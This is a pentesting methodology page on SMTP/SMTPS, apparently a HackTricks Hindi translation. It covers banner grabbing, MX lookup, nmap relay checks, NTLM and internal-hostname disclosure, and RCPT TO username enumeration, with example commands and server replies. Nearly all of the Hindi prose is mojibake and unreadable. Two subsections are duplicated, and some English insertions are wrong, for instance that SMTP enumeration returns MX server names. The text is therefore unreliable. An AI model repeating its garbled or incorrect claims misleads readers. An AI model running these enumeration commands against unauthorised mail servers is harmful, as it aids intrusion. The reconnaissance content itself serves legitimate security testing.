# 25,465,587 - рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ SMTP/s

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/) con m├бs de una d├йcada que se celebrar├б el 7 y 8 de septiembre de 2023 en Bogot├б, Colombia. Es un evento de gran contenido t├йcnico donde se presentan las ├║ltimas investigaciones en espa├▒ol que atrae a hackers e investigadores de todo el mundo.\
┬бReg├нstrate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:

{% embed url="https://www.dragonjarcon.org/" %}

## **рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА**

**SMTP (Simple Mail Transfer Protocol)** рдПрдХ TCP/IP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдИрдореЗрд▓ рднреЗрдЬрдиреЗ** рдФрд░ **рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдкреНрд░рд╛рдкреНрддрд┐ рд╕реНрдерд╛рди рдкрд░ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдХрддрд╛рд░ рдореЗрдВ рд░рдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдореЗрдВ рд╕реАрдорд┐рдд рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг, рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рджреЛ рдЕрдиреНрдп рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ, POP3 рдпрд╛ IMAP рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рд╕рд░реНрд╡рд░ рдореЗрд▓рдмреЙрдХреНрд╕ рдореЗрдВ рд╕рд╣реЗрдЬрдиреЗ рдФрд░ рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░ рд╕рд░реНрд╡рд░ рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

рдЕрдиреНрдп рд╢рдмреНрджреЛрдВ рдореЗрдВ, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдорддреМрд░ рдкрд░** рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ **рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП SMTP рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдпрд╛ рддреЛ **рдИрдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП POP3 рдпрд╛ IMAP рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рддрд╛ рд╣реИред Unix-рдЖрдзрд╛рд░рд┐рдд рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░, **sendmail** рдИрдореЗрд▓ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ SMTP рд╕рд░реНрд╡рд░ рд╣реИред рдПрдХ рд╡рд╛рдгрд┐рдЬреНрдпрд┐рдХ рдкреИрдХреЗрдЬ, Sendmail, рдореЗрдВ рдПрдХ POP3 рд╕рд░реНрд╡рд░ рд╢рд╛рдорд┐рд▓ рд╣реИред **Microsoft Exchange** рдореЗрдВ рдПрдХ SMTP рд╕рд░реНрд╡рд░ рд╢рд╛рдорд┐рд▓ рд╣реИ рдФрд░ POP3 рд╕рдорд░реНрдерди рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдпрд╣рд╛рдВ рд╕реЗ [рдпрд╣рд╛рдВ](https://whatis.techtarget.com/definition/SMTP-Simple-Mail-Transfer-Protocol)ред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### рдИрдореЗрд▓ рд╣реИрдбрд░реНрд╕

рдпрджрд┐ рдЖрдкрдХреЛ рдореМрдХрд╛ рдорд┐рд▓рддрд╛ рд╣реИ рдХрд┐ рдЖрдк **рдкреАрдбрд╝рд┐рдд рдХреЛ рдИрдореЗрд▓ рднреЗрдЬреЗрдВ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдкреГрд╖реНрда рдХреЗ рд╕рдВрдкрд░реНрдХ рдлрд╝реЙрд░реНрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ), рддреЛ рдЗрд╕реЗ рдХрд░реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рдИрдореЗрд▓ рдХреЗ рд╣реИрдбрд░реНрд╕ рдХреЛ рджреЗрдЦрдХрд░ рдкреАрдбрд╝рд┐рдд рдХреА рдЖрдВрддрд░рд┐рдХ рдЯреЛрдкреЛрд▓реЙрдЬреА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВред**

рдЖрдк рдПрдХ SMTP рд╕рд░реНрд╡рд░ рд╕реЗ рднреА рдПрдХ рдИрдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рд╡рд╣ рд╕рд░реНрд╡рд░ рдПрдХ рдЕрд╕реНрддрд┐рддреНрд╡ рдирд╣реАрдВ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ рдкрддреЗ рдкрд░ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЕрдкрд░рд╛рдзреА рдХреЛ рдПрдХ NDN рдИрдореЗрд▓ рднреЗрдЬреЗрдЧрд╛)ред рд▓реЗрдХрд┐рди, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдИрдореЗрд▓ рдХреЛ рдПрдХ рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдкрддреЗ рд╕реЗ рднреЗрдЬрддреЗ рд╣реИрдВ (SPF рдиреАрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ) рдФрд░ рдЖрдк NDN рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдкрдХреЛ рднреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдХрд┐ **рд╡рд┐рднрд┐рдиреНрди рд╕рд╛рдордЧреНрд░реА рднреЗрдЬреЗрдВ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рд╣реИрдбрд░реНрд╕ рдкрд░ рдФрд░ рд░реЛрдЪрдХ рдЬрд╛рдирдХрд╛рд░реА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ: `X-Virus-Scanned: by av.domain.com`\
рдЖрдкрдХреЛ EICAR рдкрд░реАрдХреНрд╖рдг рдлрд╝рд╛рдЗрд▓ рднреЗрдЬрдиреА рдЪрд╛рд╣рд┐рдПред\
**AV** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдЖрдкрдХреЛ **рдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

## рдореВрд▓рднреВрдд рдХрд╛рд░реНрд░рд╡рд╛рдИ

### **рдмреИрдирд░ рдЧреНрд░рдмрд┐рдВрдЧ / рдореВрд▓рднреВрдд рдХрдиреЗрдХреНрд╢рди**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**: 

SMTPS (Secure SMTP) рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ рдИрдореЗрд▓ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ SMTP (Simple Mail Transfer Protocol) рдХрд╛ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдВрд╕реНрдХрд░рдг рд╣реИ рдЬреЛ рдбреЗрдЯрд╛ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП SSL (Secure Sockets Layer) рдпрд╛ TLS (Transport Layer Security) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред SMTPS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдИрдореЗрд▓ рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд┐рдд рдФрд░ рдЧреЛрдкрдиреАрдп рд╕рдВрдЪрд╛рд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣рд╛рдВ рдХреБрдЫ SMTPS рдХреЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд┐рдВрджреБ рд╣реИрдВ:

- SMTPS рдХрд╛ рдбреЗрдЯрд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- SMTPS рдХреЗ рд▓рд┐рдП SSL рдпрд╛ TLS рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдВрдЪрд╛рд░ рдХреА рд╕реБрдирд┐рд╢реНрдЪрд┐рддрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
- SMTPS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдИрдореЗрд▓ рд╕рд░реНрд╡рд░ рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдмреАрдЪ рд╕реБрд░рдХреНрд╖рд┐рдд рддрдВрддреНрд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- SMTPS рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд▓рдЧ рдкреЛрд░реНрдЯ (рдЖрдорддреМрд░ рдкрд░ 465) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдк SMTPS рдХреЛ рдкреЗрдВрдЯреЗрд╕реНрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЧрд╡рд╛рд╣реЛрдВ, рдХрдВрдлрд┐рдЧрд░реЗрд╢рди рдФрд░ рд╕рдВрдЪрд╛рд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдЪреНрдЫреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рдЖрдк рд╡рд┐рднрд┐рдиреНрди рдЯреЗрдХреНрдирд┐рдХрд▓ рдЯреВрд▓реНрд╕ рдФрд░ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SMTPS рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдЧреЛрдкрдиреАрдпрддрд╛ рдХреЛ рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### рдХрд┐рд╕реА рд╕рдВрдЧрдарди рдХреЗ MX рд╕рд░реНрд╡рд░ рдЦреЛрдЬрдирд╛

To find the MX servers of an organization, you can use the following methods:

#### Method 1: DNS Lookup

Perform a DNS lookup for the organization's domain using the `nslookup` command or an online DNS lookup tool. Look for the MX records in the DNS response. These records will provide you with the names of the MX servers.

#### Method 2: SMTP Enumeration

Use SMTP enumeration techniques to identify the MX servers. This involves connecting to the SMTP port (port 25) of the organization's mail server and querying it for the list of accepted email addresses. The server's response will contain the names of the MX servers.

#### Method 3: Online Tools

There are various online tools available that can help you find the MX servers of an organization. These tools perform DNS lookups and provide you with the MX records.

Once you have obtained the MX server names, you can proceed with further analysis and testing to identify potential vulnerabilities or misconfigurations in the organization's email infrastructure.
```bash
dig +short mx google.com
```
### рдЬрд╛рдВрдЪ

SMTP рд╕реЗрд╡рд╛ рдХреЛ рдкреЗрдВрдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдкрд╣рд▓реЗ рд╣рдореЗрдВ рдЙрд╕рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рд╣реЛрдЧреАред рдпрд╣рд╛рдВ рдХреБрдЫ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рджрд┐рдП рдЧрдП рд╣реИрдВ:

#### 1. SMTP рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ

SMTP рд╕рд░реНрд╡рд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

- DNS рд▓реБрдХрдЕрдк: рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП MX рд░рд┐рдХреЙрд░реНрдб рджреЗрдЦреЗрдВ рдФрд░ SMTP рд╕рд░реНрд╡рд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВред
- рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдХреИрдирд┐рдВрдЧ: рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдХреИрдирд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдЦреБрд▓реЗ рдкреЛрд░реНрдЯреНрд╕ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВред

#### 2. SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

- рдЯреЗрд▓рдиреЗрдЯ: рдЯреЗрд▓рдиреЗрдЯ рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВред
- рдиреЗрдЯрдХреИрдЯ: рдиреЗрдЯрдХреИрдЯ рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВред

#### 3. SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

- рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ рдФрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

#### 4. SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

- рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд╕рд╛рде SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

#### 5. SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

- рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд╕рд╛рде SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - рд╕реВрдЪрдирд╛ рд╡рд┐рд╕реНрдлреЛрдЯ

рдпрджрд┐ рд╕рд░реНрд╡рд░ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг (Windows) рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА (рд╕рдВрд╕реНрдХрд░рдг) рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [**рдпрд╣рд╛рдБ**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666) рдорд┐рд▓реЗрдЧреАред
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
рдпрд╛ рдЗрд╕реЗ **nmap** рдкреНрд▓рдЧрдЗрди `smtp-ntlm-info.nse` рдХреЗ рд╕рд╛рде **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдХрд░реЗрдВ

### рдЖрдВрддрд░рд┐рдХ рд╕рд░реНрд╡рд░ рдирд╛рдо - рд╕реВрдЪрдирд╛ рд╡рд┐рд╕реНрдлреЛрдЯ

рдХреБрдЫ SMTP рд╕рд░реНрд╡рд░ рдПрдХ рдкреНрд░реЗрд╖рдХ рдХрд╛ рдкрддрд╛ рд╕реНрд╡рддрдГ рдкреВрд░реНрдг рдкрддрд╛ рди рджреЗрддреЗ рд╣реБрдП "MAIL FROM" рдХрдорд╛рдВрдб рдЬрд╛рд░реА рдХрд░рдиреЗ рдкрд░ рдЕрдкрдирд╛ рдЖрдВрддрд░рд┐рдХ рдирд╛рдо рдЦреЛрд▓ рджреЗрддреЗ рд╣реИрдВ:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### рд╕реНрдирд┐рдлрд┐рдВрдЧ

рдкреЛрд░реНрдЯ 25 рдХреЗ рдкреИрдХреЗрдЯреНрд╕ рд╕реЗ рдХреБрдЫ рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдирд┐рдл рдХрд░рдиреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

### [рдСрде рдмреНрд░реВрдЯрдлреЛрд░реНрд╕](../../generic-methodologies-and-resources/brute-force.md#smtp)

## рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдЧрдгрдирд╛

**рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣рдореЗрд╢рд╛ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**

### RCPT TO
```bash
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY

